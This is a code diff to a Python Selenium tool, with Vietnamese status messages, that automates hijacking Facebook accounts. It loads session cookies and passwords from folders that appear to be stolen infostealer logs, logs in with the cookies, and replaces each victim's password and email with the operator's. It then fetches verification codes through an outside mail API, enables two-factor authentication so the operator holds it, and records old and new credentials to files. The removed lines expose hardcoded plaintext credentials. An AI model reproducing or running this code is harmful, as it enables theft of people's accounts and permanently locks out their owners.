@@ -11,87 +11,73 @@ import json
 from urllib.request import urlopen
 from colored import fg, bg, attr  # pip install colored
 import dload
+import pathlib
+import os
 class FacebookSelenium:
     ref = None
-    def __init__(self, index: str, mail: str, password: str, row: int):
+    def __init__(self, index: str, folderName: str, mail: str, password: str, row: int):
         super().__init__()
         self.index = index
         self.mail = mail
         self.password = password
         self.row = row
+        self.folderName = folderName
         self.old_password = None
+        self.new_password = f"123@123aA"
         self.old_mail = None
+        self.code = None
         options = webdriver.ChromeOptions()
         options.add_argument('--disable-blink-features=AutomationControlled')
+        options.add_argument("--disable-notifications")
         self.driver = webdriver.Chrome(options=options)
+        self.driver.delete_all_cookies()
         
     def setCookieAccount(self):
-        self.driver.get('https://www.facebook.com/')  
-        time.sleep(1)      
-        accountsCookies = open("accounts/PK_111.88.112.169_26-07-23/Facebook_100093597243289.txt", 'r')
-        if accountsCookies:
-            list_cookies = accountsCookies.readlines()
-            for cookie in list_cookies:
-                if '.facebook.com' in cookie:
-                    cookieSplit = ' '.join(cookie.split() ).split(" ")
-                    self.driver.add_cookie({
-                    "domain": "facebook.com",
-                    "name": cookieSplit[5],
-                    "path": cookieSplit[2],
-                    "sameSite": "None",
-                    "value": cookieSplit[6]
-                    })
-                if "Email" in cookie:
-                    self.old_mail = cookie.replace('"Email": "', "").replace('",', "").replace(" ", "")
-                    filePassword = open("accounts/PK_111.88.112.169_26-07-23/passwords.txt", 'r')
-                    listPassword = filePassword.readlines()
-                    index = 0
-                    for password in listPassword:
-                        if self.old_mail in password:
-                            print('password[index+1]', listPassword[index+1])
-                            self.old_password = listPassword[index+1].replace("Password: ", "").replace(" ", "")
-                        index += 1
-                    print(self.old_password, self.mail)
-            time.sleep(1)    
+        try:
             self.driver.get('https://www.facebook.com/')  
             time.sleep(1)
-            try:
-                if self.driver.find_element("id",'email') or self.driver.find_element("id", 'pass'):
-                    return False
-            except:
-                if self.old_password and self.mail:
+            accountPath = ''
+            passwordPath = ''
+            data = pathlib.Path(f'accounts/{self.folderName}')
+            for item in data.iterdir():
+                if item.is_file() and 'Facebook' in str(item):
+                    fileName = str(item).replace(f"accounts\{self.folderName}\\", "")
+                    accountPath = f'accounts/{self.folderName}/{fileName}'
+                if item.is_file() and 'password' in str(item):
+                    passwordPath = f'accounts/{self.folderName}/passwords.txt'
+            accountsCookies = open(f"{accountPath}", 'r')
+            if accountsCookies:
+                list_cookies = accountsCookies.readlines()
+                for cookie in list_cookies:
+                    if '.facebook.com' in cookie:
+                        cookieSplit = ' '.join(cookie.split() ).split(" ")
+                        self.driver.add_cookie({
+                        "domain": "facebook.com",
+                        "name": cookieSplit[5],
+                        "path": cookieSplit[2],
+                        "sameSite": "None",
+                        "value": cookieSplit[6]
+                        })
+                    if "Email" in cookie:
+                        self.old_mail = cookie.replace('"Email": "', "").replace('",', "").replace(" ", "")
+                        filePassword = open(passwordPath, 'r')
+                        listPassword = filePassword.readlines()
+                        index = 0
+                        for password in listPassword:
+                            if self.old_mail in password:
+                                print('password[index+1]', listPassword[index+1])
+                                self.old_password = listPassword[index+1].replace("Password: ", "").replace("password: ", "").replace(" ", "")
+                            index += 1
+                        print(self.old_password, self.mail)
+                time.sleep(1)    
+                self.driver.get('https://www.facebook.com/')  
+                time.sleep(1)
+                try:
+                    if self.driver.find_element("id",'email') or self.driver.find_element("id", 'pass'):
+                        return False
+                except:
                     return True
-                return False
-
-    def login(self):
-        try:
-            # Opening Facebook.
-            self.driver.get('https://www.facebook.com/')
-            print(f"{fg('yellow_1')}Faceboook Opened!{attr('reset')}")
-            time.sleep(1)
-
-            # Entering Email and Password
-            username_box = self.driver.find_element_by_id('email')
-            username_box.send_keys("0369574322")
-            print(f"{fg('yellow_1')}Email entered{attr('reset')}")
-            time.sleep(1)
-
-            password_box = self.driver.find_element_by_id('pass')
-            password_box.send_keys("Quy2002@")
-            print(f"{fg('yellow_1')}Password entered{attr('reset')}")
-
-            # Pressing The Login Button
-            login_box = self.driver.find_element_by_id('loginbutton')
-            login_box.click()
-            
-            time.sleep(3)
-            
-            if self.driver.find_element_by_id('email') or \
-                    self.driver.find_element_by_id('pass'):
-                return False
-
-            return True
-        except Exception:
+        except:
             return False
 
     def get_cookies(self):
@@ -100,7 +86,7 @@ class FacebookSelenium:
         return self.driver.get_cookies()
     
     def save_cookie(self):
-        with open("cookie", 'wb') as filehandler:
+        with open(f"data/{self.mail}/cookie_{self.mail}", 'wb') as filehandler:
             pickle.dump(self.driver.get_cookies(), filehandler)
           
     def get_main_page(self):
@@ -140,11 +126,11 @@ class FacebookSelenium:
                 print('dzo 5')
                 newPassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/table/tbody/tr[1]/td[2]/div/input")
                 print('newPassword')
-                newPassword.send_keys("12345qwe@aAaAa")
+                newPassword.send_keys(self.new_password)
                 time.sleep(2)
                 print('dzo 6')
                 repeatPassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/table/tbody/tr[2]/td[2]/div/input")
-                repeatPassword.send_keys("12345qwe@aAaAa")
+                repeatPassword.send_keys(self.new_password)
                 
                 time.sleep(2)
                 nextChangePassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
@@ -161,14 +147,14 @@ class FacebookSelenium:
             time.sleep(3)
             
             newEmailInput = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/div/div[2]/input")
-            newEmailInput.send_keys("taceyheringtonus@hotmail.com")
+            newEmailInput.send_keys(self.mail)
             
             newEmailBtn = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button[1]")
             newEmailBtn.click()
             
             #send code 
             time.sleep(20)
-            codeMail = self.getEmailCode('dqwdqwd@mgialc.', 'qwdqwdqw')
+            codeMail = self.getEmailCode(self.mail, self.password)
             if codeMail == None:
                 return False
             print(codeMail)
@@ -179,6 +165,18 @@ class FacebookSelenium:
             approveCode.click()
             try: 
                 if self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button"):
+                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
+                    nextProtect5.click()
+                    time.sleep(1)
+                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
+                    nextProtect5.click()
+                    time.sleep(1)
+                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
+                    nextProtect5.click()
+                    time.sleep(1)
+                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
+                    nextProtect5.click()
+                    time.sleep(1)
                     nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                     nextProtect5.click()
             except:
@@ -212,7 +210,7 @@ class FacebookSelenium:
             try:
                 if self.driver.find_element("id", "ajax_password"):
                     passwordInput = self.driver.find_element("id", "ajax_password")
-                    passwordInput.send_keys("12345qwe@aAaAa")
+                    passwordInput.send_keys(self.new_password)
             except:
                 pass
             try:
@@ -224,15 +222,15 @@ class FacebookSelenium:
             print('dzo key')
             key =  self.driver.find_element("xpath", "/html/body/div[6]/div[2]/div/div/div/div/div/div/div[2]/div/div/div[2]/div[2]/span[2]").text
             print(key)
-            code = self.get2fa(key)
-            print('code', code)
+            self.code = self.get2fa(key)
+            print('code', self.code)
             continuteCode = self.driver.find_element("xpath", "/html/body/div[6]/div[2]/div/div/div/div/div/div/div[3]/span[2]/div/div[2]/button")
             continuteCode.click()
             
             time.sleep(5)
             for i in range(1,7):
                 inputCOde = self.driver.find_element("xpath", f"/html/body/div[6]/div[2]/div/div/div/div/div/div/div[2]/div/div/div/div[2]/div/div/form/input[{i}]")
-                inputCOde.send_keys(code[i-1])
+                inputCOde.send_keys(self.code[i-1])
                 time.sleep(1)
             
             time.sleep(5)
@@ -249,13 +247,9 @@ class FacebookSelenium:
             
             
     def getEmailCode(self, newEmail, newEmailPassword):
-        # options = webdriver.ChromeOptions()
-        # options.add_argument('--disable-blink-features=AutomationControlled')
-        # driver = webdriver.Chrome(options=options)
-        # self.driver.get('https://accountscenter.facebook.com/personal_info')
         print('dzo get email code')
         try:
-            response = dload.json("https://tools.dongvanfb.net/api/get_code?mail=taceyheringtonus@hotmail.com&pass=4HWfg65GIl&type=")
+            response = dload.json(f"https://tools.dongvanfb.net/api/get_code?mail={newEmail}&pass={newEmailPassword}&type=")
             print(response)
             if response:
                 return response['code']
@@ -328,30 +322,42 @@ class FacebookSelenium:
             return False
     
     def run(self):
-        before = time.time()
-        self.ref.show.emit(self.row, 3, "Đang changeinfo......")
-        time.sleep(1)
-        checkLogin = self.setCookieAccount()
-        if checkLogin:
-            after = time.time()
-            self.ref.show.emit(self.row, 3, f"Login cookie thành công")
-        else:
-            self.ref.show.emit(self.row, 3, f"Login cookie thất bại")
-        time.sleep(5)
+        self.ref.show.emit(self.row, 0, self.folderName)
+        self.ref.show.emit(self.row, 4, "Đang change info......")
+        checkLogin = self.setCookieAccount() 
+        print('checkLogin', checkLogin)
+        if checkLogin == True:
+            self.save_cookie()
+            self.ref.show.emit(self.row, 4, f"Login cookie thành công")
+            changeProtected = self.protect_account()
+            print('changeProtected', changeProtected)
+            if changeProtected == True:
+                self.ref.show.emit(self.row, 4, f"Thay đổi thông tin thành công")
+                open("success.txt", 'a+').write("%s|%s|%s\n"%(self.old_mail, self.mail, self.password))
+                openTwoAuthen = self.openTwoAuthen()
+                print('openTwoAuthen', openTwoAuthen)
+                if openTwoAuthen == True:
+                    self.ref.show.emit(self.row, 4, f"Bật xác thực 2 lớp thành công")
+                    if checkLogin == True and changeProtected == True and openTwoAuthen == True:
+                        self.ref.checksuccess.emit(True, self.row, self.folderName, self.old_mail, self.mail, self.password)  
+                    else:
+                        self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)    
+                    time.sleep(10)
+                    os.makedirs(os.path.dirname(f"data/{self.mail}/{self.mail}.txt"), exist_ok=True)
+                    open(f"data/{self.mail}/{self.mail}.txt", 'w').write("%s|%s|%s|%s|%s\n"%(self.mail, self.password, self.code, self.new_password))
+                    self.save_cookie()
+                if openTwoAuthen == False:
+                    self.ref.show.emit(self.row, 4, f"Bật xác thực 2 lớp thất bại")
+                    self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)  
+            if changeProtected == False:
+                self.ref.show.emit(self.row, 4, f"Thay đổi thông tin thất bại")
+                self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)  
+            time.sleep(3)
+
+        if checkLogin == False:
+            self.ref.show.emit(self.row, 4, f"Login cookie thất bại")
+            self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)  
         #protected account
-        changeProtected = self.protect_account()
-        print('changeProtected')
-        if changeProtected:
-            after = time.time()
-            self.ref.show.emit(self.row, 3, f"Thay đổi thông tin thành công")
-        else:
-            self.ref.show.emit(self.row, 3, f"Thay đổi thông tin thất bại")
         time.sleep(3)
-        openTwoAuthen = self.openTwoAuthen()
-        if openTwoAuthen:
-            after = time.time()
-            self.ref.show.emit(self.row, 3, f"Bật xác thực 2 lớp thành công")
-            self.ref.checksuccess.emit(True, self.mail)
-        else:
-            self.ref.show.emit(self.row, 3, f"Bật xác thực 2 lớp thất bại")
-        #changeEmail = self.replaceEmail()
+        self.driver.quit()
+        return
